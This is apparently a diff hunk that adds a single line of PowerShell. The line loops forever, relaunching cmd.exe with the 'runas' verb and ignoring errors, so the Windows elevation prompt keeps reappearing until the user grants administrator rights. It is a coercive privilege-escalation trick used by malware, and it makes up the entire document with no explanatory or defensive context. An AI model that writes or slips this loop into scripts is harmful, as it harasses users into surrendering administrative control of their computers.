@@ -1,0 +1,1 @@
+while($true){try{Start-Process "cmd.exe" -Verb runas;exit}catch{}}
